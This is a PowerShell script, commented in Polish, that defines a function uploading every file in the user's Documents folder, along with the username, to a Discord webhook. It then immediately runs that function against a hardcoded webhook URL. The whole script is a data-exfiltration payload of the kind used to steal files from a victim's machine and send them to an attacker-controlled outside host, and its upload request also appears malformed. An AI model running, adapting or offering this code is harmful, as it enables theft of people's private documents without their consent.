function Upload-FilesToDiscord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$folderPath,
        [parameter(Position=1, Mandatory=$False)]
        [string]$webhookUrl
    )

    # Sprawdzenie, czy podano ścieżkę do folderu
    if ([string]::IsNullOrEmpty($folderPath)){
        $folderPath = "$env:USERPROFILE\Documents"
    }

    # Sprawdzenie, czy podano webhook URL
    if ([string]::IsNullOrEmpty($webhookUrl)){
        Write-Error "Webhook URL is required."
        return
    }

    # Pobranie plików z folderu
    $files = Get-ChildItem -Path $folderPath

    foreach ($file in $files) {
        $filePath = $file.FullName
        $fileName = $file.Name

        $Body = @{
            'username' = $env:USERNAME
            'content'  = "Uploading file: $fileName"
        }

        # Wysyłanie wiadomości tekstowej na Discord
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)

        # Wysyłanie pliku na Discord
        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -Headers @{ 'Content-Type' = 'multipart/form-data' }
    }
}

# Przykład użycia
$webhookUrl = "https://discord.com/api/webhooks/1169613960429965382/uSQurwvfaGLDPwSZosk8AdXV3Yfk0kkupkFZPUJvhjf7lS5aww0M6GWxViPns5CFUZON"
$folderPath = "$env:USERPROFILE\Documents"

Upload-FilesToDiscord -folderPath $folderPath -webhookUrl $webhookUrl
